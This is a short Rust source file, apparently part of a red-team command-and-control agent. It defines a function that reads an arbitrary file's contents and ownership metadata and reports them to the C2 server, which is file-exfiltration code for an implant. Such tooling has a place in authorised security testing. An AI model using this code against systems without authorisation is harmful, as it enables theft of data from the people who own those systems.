use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::Agent;
use eldritch_libfile::std::file_metadata::get_file_metadata;
use pb::{c2, eldritch};

pub fn file(agent: Arc<dyn Agent>, task_id: i64, path: String) -> Result<(), String> {
    let content = std::fs::read(&path).map_err(|e| e.to_string())?;

    let meta_info = get_file_metadata(std::path::Path::new(&path)).map_err(|e| e.to_string())?;

    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        permissions: meta_info.permissions,
        owner: meta_info.owner,
        group: meta_info.group,
        ..Default::default()
    };
    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    let req = c2::ReportFileRequest {
        task_id,
        chunk: Some(file_msg),
    };

    agent.report_file(req).map(|_| ())
}
